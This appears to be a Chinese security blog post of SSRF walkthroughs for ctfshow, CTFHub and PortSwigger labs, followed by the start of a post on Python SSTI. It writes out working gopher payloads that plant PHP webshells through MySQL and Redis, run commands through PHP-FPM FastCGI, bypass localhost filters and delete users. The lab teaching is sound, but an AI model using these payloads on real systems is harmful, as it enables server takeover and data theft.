使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求
nc启动监听，监听2333端口：nc -lp 2333
使用curl发送http请求，命令为
curl gopher://192.168.0.119:2333/abcd

此时nc收到的消息为：bcd
如果想要接收到所有的消息，需要在使用gopher协议时在url后加入一个字符（该字符可随意写）
Gopher发送请求HTTP GET请求：
需要以下三步：

1、构造HTTP数据包2、URL编码、替换回车换行为%0d%0a3、发送gopher协议

我准备了一个PHP的代码，如下：
&lt;?php    echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\n&quot;?&gt;

一个GET型的HTTP包，如下：
GET /ssrf/base/get.php?name=Margin HTTP/1.1Host: 1.0.0.1

URL编码后为：
curl gopher://1.0.0.1:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%201.0.0.1%0d%0A

在转换为URL编码时候有这么几个坑

1、问号（？）需要转码为URL编码，也就是%3f2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）

Gopher发送请求HTTP POST请求：
以下四个参数为post传参时所必须的参数：
POST /ssrf/base/post.php HTTP/1.1host:192.168.0.109Content-Type:application/x-www-form-urlencodedContent-Length:11name=Margin

post.php的代码为
&lt;?php    echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\n&quot;?&gt;

使用curl发起gopher的POST请求并进行url编码：
curl gopher://0.0.0.1:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:0.0.0.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A

发送成功
使用Gopher协议url编码次数传参经过多少次跳转就需要经过多少次url编码。
直接curl后接gopher:&#x2F;&#x2F;就编码一次。
利用?url&#x3D;gopher:&#x2F;&#x2F;就编码两次。
还经过302跳转，就编码三次。
ctfshow实战web-351&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt;

对上述代码的解析如下：

禁止显示 PHP 错误报告，使用 error_reporting(0)；
使用 highlight_file(__FILE__) 显示当前 PHP 文件的源代码；
获取通过 POST 请求传递的 URL，存储在 $url 变量中；
使用 curl_init() 初始化一个 cURL 会话；
使用 curl_setopt() 函数设置 cURL 选项，包括关闭 HTTP 头信息的输出（CURLOPT_HEADER）以及将返回的数据以字符串形式返回（CURLOPT_RETURNTRANSFER）；
使用 curl_exec() 函数执行 cURL 会话，获取 URL 对应页面的内容，并将结果存储在 $result 变量中；
使用 curl_close() 函数关闭 cURL 会话；
最后，使用 echo 输出获取到的页面内容

尝试一下能不能访问内网：url=127.0.0.1，页面又回显了一遍上述代码，说明可以
盲猜一波flag.php在当前目录下：url=127.0.0.1/flag.php回显出flag，也可以url=localhost/flag.php
web-352&amp;353&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125; ?&gt;

可以对127.0.0.1进行编码绕过，具体进上面文章中的绕过方法（句号的方法行不通）
url=http://2130706433/flag.php：得到flag
在Linux环境中，0代表自身地址，也可以url=http://0/flag.php
web-354（sudo.cc）&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?

sudo.cc相当于127.0.0.1 
url=http://sudo.cc/flag.php：得到flag
web-355&amp;356&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=5))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;

strlen($host)&lt;=5：要求输入的主机名长度小于等于5
这里我们可以采用0来绕过：url=http://0/flag.php
web-356：主机名长度要求小于等于3
web-357&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$ip = gethostbyname($x[&#x27;host&#x27;]);echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;    die(&#x27;ip!&#x27;);&#125;echo file_get_contents($_POST[&#x27;url&#x27;]);&#125;else&#123;    die(&#x27;scheme&#x27;);&#125;?&gt;

if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;     die(&#39;ip!&#39;); &#125;：验证IP地址是否有效，并且不是私有IP地址或保留IP地址，验证失败的话就会输出ip并停止运行
这说明了地址不能是127.0.0.1，所以我们可以采用302跳转的方式来进入内网
在服务器上面开一个端口，并且其php文件如下：
&lt;?php header(&quot;Location:http://127.0.0.1/flag.php&quot;);

然后在get传参为：?url=http://555.555.555.555:555，得到flag，题目解决
web-358&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123;    echo file_get_contents($url);&#125;

parse_url解析问题，参考文章：parse_url小结
根据参考文章和本片文章前面提到过的绕过方法，最后的payload为：http://ctf.@127.0.0.1/flag.php#show
其实将#改为？也是可以的
web-359这题是要打无密码保护的mysql
首先我们开启proxy，登录一下，在bp的代理模块的HTTP历史记录中找到/check.php，内容如下：

可以发现Post传参中有returl，参数是网址，我们可以使用gopher协议来操作
所以我们可以采用工具gopherus（在下文的CTFHub中我有提供下载的链接）
我们输入命令：python2 gopherus.py --exploit mysql，剩下的如下：select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/aa.php&#39;;：这条命令是使用数据库的功能创建一个php文件，文件位置在/var/www/html/aa.php
得到的payload再拿去编码一次后拿去使用，然后再用蚁剑包含该文件便可以了
得到flag，题目解决
web-360这题题目叫打redis
 &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt;

于是我们跟上题一样，用gopherus工具来打
步骤跟下面ctfhub里面的Redis协议的操作步骤一模一样，这里就不多说了
CTFHubPOST请求在题目环境中访问：?url=127.0.0.1/flag.php，看到页面弹出一个输入框，查看源码如下：
&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;!-- Debug: key=7cc8e7f97ec84ca8f88fed4a62df26d1--&gt;&lt;/form&gt;

将该值填入输入框，得到回显为：Just View From 127.0.0.1
然后访问：?url=file:///var/www/html/index.php，得到如下代码：
&lt;?php// 关闭所有错误报告error_reporting(0);// 检查请求中是否包含 &#x27;url&#x27; 参数if (!isset($_REQUEST[&#x27;url&#x27;]))&#123;    // 如果没有 &#x27;url&#x27; 参数，重定向到自身并附加一个默认的 &#x27;url&#x27; 参数    header(&quot;Location: /?url=_&quot;);    exit; // 终止脚本执行&#125;// 初始化一个cURL会话$ch = curl_init();// 设置cURL选项curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]); // 设置要请求的URL为用户提供的 &#x27;url&#x27; 参数值curl_setopt($ch, CURLOPT_HEADER, 0); // 不包含头部信息在输出中curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // 允许cURL处理重定向// 执行cURL会话curl_exec($ch);// 关闭cURL会话并释放资源curl_close($ch);

访问：?url=file:///var/www/html/flag.php，代码如下：
&lt;?php// 关闭所有错误报告error_reporting(0);// 检查访问者的IP地址是否为127.0.0.1if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;    echo &quot;Just View From 127.0.0.1&quot;;    return;&#125;// 获取环境变量 &quot;CTFHUB&quot; 的值$flag = getenv(&quot;CTFHUB&quot;);// 生成flag的MD5哈希值$key = md5($flag);// 检查POST请求中是否包含正确的keyif (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;    // 如果POST请求中的key正确，输出flag    echo $flag;    exit;&#125;?&gt;&lt;!-- HTML表单，提交到当前脚本 --&gt;&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;&lt;/form&gt;

由于 $_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;这个无法绕过，所以无法利用flag.php，所以只能尝试通过index.php向目标发送post请求
尝试使用 Gopher 协议向服务器发送 POST 包首先构造 Gopher协议所需的 POST请求：
POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Length: 36Content-Type: application/x-www-form-urlencodedkey=7cc8e7f97ec84ca8f88fed4a62df26d1

根据上面的知识我们知道我们需要编码两次，第一次编码如下：
POST%20/flag.php%20HTTP/1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Length%3A%2036%0AContent-Type%3A%20application/x-www-form-urlencoded%0A%0Akey=7cc8e7f97ec84ca8f88fed4a62df26d1

 在第一次编码后的数据中，将%0A全部替换为%0D%0A，如下：
POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1:80%0AContent-Length:%2036%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Akey=7cc8e7f97ec84ca8f88fed4a62df26d1

将其进行第二次编码，如下：
POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1%253A80%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=7cc8e7f97ec84ca8f88fed4a62df26d1

所以我们可以构造payload如下：
view-source:http://challenge-6e02fe4cf49383ad.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=7cc8e7f97ec84ca8f88fed4a62df26d1

上传文件我们尝试访问 ?/url=127.0.0.1/flag.php
发现上传页面并没有提交按钮
我们可以通过查看源码，并在from表单中写入 submit  ，如下图：
&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt; 我们随便上传一个文件，页面提示：Just View From 127.0.0.1
让我们拦截一下上传请求，然后将改为我们所需要的（不是必要的可以删去），如下：
POST /flag.php HTTP/1.1Host: 127.0.0.1Content-Length: 288Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylc7CixnmWBKYEk99------WebKitFormBoundarylc7CixnmWBKYEk99Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plainMancity------WebKitFormBoundarylc7CixnmWBKYEk99Content-Disposition: form-data; name=&quot;submit&quot;提交------WebKitFormBoundarylc7CixnmWBKYEk99--

按照上面的步骤进行编码，最后payload如下：
?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520288%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundarylc7CixnmWBKYEk99%250D%250A%250D%250A------WebKitFormBoundarylc7CixnmWBKYEk99%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522test.txt%2522%250D%250AContent-Type%253A%2520text%252Fplain%250D%250A%250D%250AMancity%250D%250A------WebKitFormBoundarylc7CixnmWBKYEk99%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%250D%250A------WebKitFormBoundarylc7CixnmWBKYEk99--

发送，得到Flag
URL Bypass题目要求：请求的URL中必须包含http://notfound.ctfhub.com
所以我们可以利用http基本身份认证来进行绕过
payload为：?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
得到flag，题目解决
数字IP Bypass如果说你直接输入：?url=127.0.0.1，那么题目会回显hacker! Ban &#39;/127|172|@/&#39;
这说明我们输入的内容里面不能有127，172，@
那么我们可以进制转换一下，比如把其转换为十进制：?url=2130706433/flag.php
得到flag，题目解决
302跳转 Bypass首先用file协议查看一下源码：?url=file://var/www/html/index.php，得到如下：
&lt;?phperror_reporting(0);if (!isset($_REQUEST[&#x27;url&#x27;])) &#123;    header(&quot;Location: /?url=_&quot;);    exit;&#125;$url = $_REQUEST[&#x27;url&#x27;];if (preg_match(&quot;/127|172|10|192/&quot;, $url)) &#123;    exit(&quot;hacker! Ban Intranet IP&quot;);&#125;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_exec($ch);curl_close($ch);

第一种
可以看到正则表达式ban掉的数字，惊奇地发现没有ban掉localhost，所以我们可以尝试一下：?url=http://localhost/flag.php
得到flag，题目解决
第二种
进制转化，把127.0.0.1转化成其他进制的，也可以成功
第三种
当然这题的标准做法是要利用302跳转
让我们在服务器上面写一个php重定向文件，如下：
&lt;?php header(&quot;Location:http://127.0.0.1/flag.php&quot;);

把它放到公网上，然后用url访问就可以啦
DNS重绑定 Bypass访问：?url=file:///var/www/html/index.php，得到如下代码：
&lt;?phperror_reporting(0);if (!isset($_REQUEST[&#x27;url&#x27;])) &#123;    header(&quot;Location: /?url=_&quot;);    exit;&#125;$url = $_REQUEST[&#x27;url&#x27;];if (preg_match(&quot;/127|172|10|192/&quot;, $url)) &#123;    exit(&quot;hacker! Ban Intranet IP&quot;);&#125;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);

但是按照上题的思路来做的话根本过不去
按照题目，这题就采用DNS重绑定来进行绕过吧
贴个文章可以去看看：浅谈DNS重绑定漏洞，当然上面我也有简单讲讲
利用文章提供的网址来进行利用：https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg

自己输入所需的网址，构造payload为：?url=7f000001.c0a80001.rbndr.us/flag.php
得到flag，题目解决
FastCGI协议必看原理 -&gt; 附件文章在这里
关于FastCGI协议附件文章讲的很明白了
关于这个协议我们主要就是要利用一个 PHP-FPM未授权访问漏洞，PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。
接下来用到的EXP，就是根据之前介绍的fastcgi协议来编写的，代码如下：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 。兼容Python2和Python3，方便在内网用
我们这里使用Gopherus脚本(GitHub下载)构造payload，该脚本只能在python2.7下运行
然后可以将解压完后的文件夹挪到虚拟机里面，执行：apt install python2，安装python2
然后执行命令：python2 gopherus.py --exploit fastcgi，页面选择index.php，命令选择ls
把获得的pyload拿去再编码一次就可以
然后再来一遍，这次命令选择cat /f*，得到pyload，拿去再编码一次，如下：
gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F6%2506%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH59%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253B%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Ff%252A%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500

拿去用，得到flag
Redis协议这次也是一样，用Gopherus脚本来完成该题
使用指令：python2 gopherus.py --exploit redis，选择php，默认路径，代码的话我们使用一句话代码：&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt;

得到payload，拿去再编码一次，如下：
gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A

拿去用，得到如下界面：

虽然是这样的，但是我们的shell.php已经写入了，访问，如下：
虽然有一些不可见字符啥的，但还是说明可以访问，用蚁剑连接，得到flag
Bp实验室Lab：针对本地服务器的基本SSRF题目：要解决实验室问题，请更改库存检查URL以访问 http://localhost/admin 的管理员界面并删除用户 carlos
于是我们先打开插件Proxy，然后访问任意一件商品，点击检查库存
做完这些步骤之后我们去bp的代理模块的HTTP历史记录中查看每个条目，最后发现一条可疑的：/product/stock，将它发送到重放器中，其post传参的stockApi其实就是编码后的访问库存的url，于是我们将其改为编码后的 http://localhost/admin，发送如下：

我们需要删除用户carlos，url改为：http://location/admin/delete?username=carlos，编码后发送
题目解决
Lab：基本SSRF与另一个后端系统的对比要求：要解决这个问题，请使用库存检查功能扫描端口8080上的管理员界面的内部 192.168.0.X 范围，然后使用它删除用户 carlos
于是我们先打开插件Proxy，然后访问任意一件商品，点击检查库存
做完这些步骤之后我们去bp的代理模块的HTTP历史记录中查看每个条目，最后发现一条可疑的：/product/stock，将它发送到intruder中，其post传参的stockApi改为我们所需要的：http%3A%2F%2F192.168.0.1%3A8080%2Fadmin，添加1位置为pyload，进行爆破，数值设为1到300，间隔为1，开始攻击
把爆破后的结果按状态码从小到大排序，得到200状态码的网址，后续的操作和上一题的一模一样
题目解决
Lab：带外检测的盲 SSRF要求：该网站使用分析软件，在加载产品页面时获取 Referer 标头中指定的 URL。要完成本实验，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。
先打开插件Proxy，然后访问任意一件商品，之后我们去bp的代理模块的HTTP历史记录中查看每个条目，将/product?productId=1条目发送到重放器中，通过题目可知我们应该改变Referer标头的url，所以我们去Burp Collaborator复制一个，然后将其代替掉原本的url，点击发送，之后在Burp Collaborator模块点击立即轮询，可以查看到几条数据
到这步后，题目便解决了
Lab：具有基于黑名单的输入过滤器的 SSRF要求：要完成该实验，请将库存检查 URL 更改为访问管理界面 http://localhost/admin 并删除用户 carlos 。开发人员部署了两种较弱的反 SSRF 防御措施，您需要绕过它们
在bp的代理模块的HTTP历史记录中查看每个条目，然后将/product/stock发送到重放器中，先将stockApi改为http%3A%2F%2F127.0.0.1%2Fadmin，发送发现被阻止了
开始一步步尝试，先是http%3A%2F%2F127.1，发送成功，接着在后面加上/admin，被阻止，猜测是拦住了admin，所以我们可以将a编码两次，为http%3A%2F%2F127.0.0.1%2F%2561dmin，发送成功，访问到了admin页面，接下来的操作就是删除用户carlos
后面按之前那样做就可以了，题目解决
Lab：SSRF 通过开放重定向漏洞绕过过滤器描述：要完成该实验，请将库存检查 URL 更改为访问管理界面 http://192.168.0.12:8080/admin 并删除用户 carlos 。库存检查器被限制只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向
首先随机访问一个产品并检查库存，然后点击next product
检查HTTP历史记录，有两条比较有意思的都将其发送到重放器中，分别是/product/stock和/product/nextProduct?currentProductId=1&amp;path=/product?productId=2 
第二个条目内容如下：

原本第一个条目的stockApi解码后为：/product/stock/check?productId=2&amp;storeId=1
尝试直接把第一个条目的stockApi改为我们需要的http%3A%2F%2F192.168.0.12%3A8080%2Fadmin，会被阻止访问
发现原本的stcockApi的内容和第二个条目中的get传参的参数是一样的
将第二个条目中的path改一下/product?productId=3，发送，然后把stockApi改为相对应的，发送，数据成功变更
这说明了我们通过更改path的内容实现了重定向，所以我们只需要把我们要的url放在path中：/product/nextProduct?path=http://192.168.0.12:8080/admin，发送，然后对应的stockApi改为：%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadmin，发送，响应变为了对应的页面的内容，然后开始删除用户carlos
更改path：/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
更改stockApi：%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
成功伤处用户carlos，题目解决
引用SSRF漏洞原理解析通俗易懂
SSRF漏洞原理攻击与防御(超详细总结)
Gopher协议在SSRF漏洞中的深入研究（附视频讲解）
CTFHub技能树 Web-SSRF篇（保姆级通过教程）
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>ssti学习</title>
    <url>/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[常用魔术方法__class____class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 __class__ 是类的一个内置属性，表示类的类型，返回 &lt;type &#39;type&#39;&gt; ； 也是类的实例的属性，表示实例对象的类。
&gt;&gt;&gt; &#x27;&#x27;.__class__&lt;type &#x27;str&#x27;&gt;&gt;&gt;&gt; ().__class__&lt;type &#x27;tuple&#x27;&gt;&gt;&gt;&gt; [].__class__&lt;type &#x27;list&#x27;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type &#x27;dict&#x27;&gt;

获取基类__bases__：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的元组（虽然只有一个元素）。注意是直接父类！！！
&gt;&gt;&gt; ().__class__.__bases__(&lt;type &#x27;object&#x27;&gt;,)&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__(&lt;type &#x27;basestring&#x27;&gt;,)&gt;&gt;&gt; [].__class__.__bases__(&lt;type &#x27;object&#x27;&gt;,)&gt;&gt;&gt; &#123;&#125;.__class__.__bases__(&lt;type &#x27;object&#x27;&gt;,)&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__bases__[0]   // python2下与python3下不同&lt;type &#x27;object&#x27;&gt;&gt;&gt;&gt; [].__class__.__bases__[0]&lt;type &#x27;object&#x27;&gt;

获取基类还能用 __mro__ 方法，__mro__ 方法可以用来获取一个类的调用顺序，比如：
class A:    def foo(self):        print(&quot;A&quot;)class B(A):    passclass C(A):    def foo(self):        print(&quot;C&quot;)class D(B, C):    passprint(D.__mro__)

输出结果如下：
(&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)

在这个例子中，类 D 的 MRO 顺序是 D -&gt; B -&gt; C -&gt; A -&gt; object。这意味着在搜索方法时，Python 解释器会先在 D 中查找，然后按照 B -&gt; C -&gt; A -&gt; object 的顺序依次查找父类，直到找到匹配的方法或属性
除此之外，我们还可以利用 __base__ 方法获取直接基类：
&gt;&gt;&gt; &quot;&quot;.__class__.__base__&lt;type &#x27;basestring&#x27;&gt;

有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（&lt;class&#39;object&#39;&gt;）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。
__subclasses__()在 Python 中，__subclasses__() 是一个特殊方法（也称为魔术方法或魔术属性），用于获取当前类的直接子类列表。
当你调用一个类的 __subclasses__() 方法时，它会返回一个包含所有直接子类的列表。这些子类是在程序运行时动态创建的，因此列表的内容取决于程序执行的上下文和流程。
以下是一个简单的示例：
class A:    passclass B(A):    passclass C(A):    passclass D(B):    passprint(A.__subclasses__())  # 输出 [&lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;]print(B.__subclasses__())  # 输出 [&lt;class &#x27;__main__.D&#x27;&gt;]

在这个示例中，类 A 有两个直接子类 B 和 C，类 B 有一个直接子类 D。因此，调用 A.__subclasses__() 返回的列表包含了 B 和 C，而调用 B.__subclasses__() 返回的列表只包含了 D
注意：这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。
当然我们也可以直接用object.__subclasses__()，会得到和上面一样的结果。SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。
__builtins__在 Python 中，__builtins__ 是一个指向内建模块（built-in module）的引用。这个模块包含了 Python 中内置的常用函数、异常和其他对象。
__builtins__ 变量是一个字典，包含了内建模块中所有的内置函数和对象。你可以通过 __builtins__ 字典来访问这些内置函数和对象。
例如，你可以通过 __builtins__[&#39;print&#39;] 来访问内置的 print 函数，或者通过 __builtins__[&#39;TypeError&#39;] 来访问内置的 TypeError 异常类。
但是在实际编码中，我们通常直接使用内置函数和对象的名称，而不是通过 __builtins__ 来访问。例如，我们通常使用 print() 函数而不是 __builtins__[&#39;print&#39;]。
需要注意的是，在一些限制性的环境中，比如一些解释器中或者在使用了 __import__() 函数时，可能会限制对 __builtins__ 的直接访问。
__globals__在 Python 中，__globals__ 是一个特殊属性，用于访问包含当前作用域中所有全局变量的字典。这个属性是一个字典，它包含了当前作用域中所有全局变量的名称和对应的值。
在 Python 中，每个作用域都有一个与之相关联的 __globals__ 字典，用于存储该作用域中的全局变量。这个字典可以通过访问作用域对象的 __globals__ 属性来获取
例子如下：
x = 10  # 定义一个全局变量 xdef func():    y = 20  # 定义一个局部变量 y    print(&quot;Global variables:&quot;, globals())  # 输出全局变量字典    print(&quot;Value of x:&quot;, globals()[&#x27;x&#x27;])  # 输出全局变量 x 的值func()  # 调用函数

利用 SSTI 读取文件Python 2在上文中我们使用 __subclasses__ 方法查看子类的时候，发现可以发现索引号为40指向file类：
for i in enumerate(&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()): print i.....(0, &lt;type &#x27;type&#x27;&gt;)(1, &lt;type &#x27;weakref&#x27;&gt;)(2, &lt;type &#x27;weakcallableproxy&#x27;&gt;)(3, &lt;type &#x27;weakproxy&#x27;&gt;)(4, &lt;type &#x27;int&#x27;&gt;)(5, &lt;type &#x27;basestring&#x27;&gt;)(6, &lt;type &#x27;bytearray&#x27;&gt;)(7, &lt;type &#x27;list&#x27;&gt;)(8, &lt;type &#x27;NoneType&#x27;&gt;)(9, &lt;type &#x27;NotImplementedType&#x27;&gt;)(10, &lt;type &#x27;traceback&#x27;&gt;)(11, &lt;type &#x27;super&#x27;&gt;)(12, &lt;type &#x27;xrange&#x27;&gt;)(13, &lt;type &#x27;dict&#x27;&gt;)(14, &lt;type &#x27;set&#x27;&gt;)(15, &lt;type &#x27;slice&#x27;&gt;)(16, &lt;type &#x27;staticmethod&#x27;&gt;)(17, &lt;type &#x27;complex&#x27;&gt;)(18, &lt;type &#x27;float&#x27;&gt;)......(38, &lt;type &#x27;ellipsis&#x27;&gt;)(39, &lt;type &#x27;member_descriptor&#x27;&gt;)(40, &lt;type &#x27;file&#x27;&gt;)(41, &lt;type &#x27;PyCapsule&#x27;&gt;)(42, &lt;type &#x27;cell&#x27;&gt;)(43, &lt;type &#x27;callable-iterator&#x27;&gt;)......

for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print i分析如下：

&#39;&#39;.__class__: 获取空字符串 &#39;&#39; 的类型，即 str 类型。
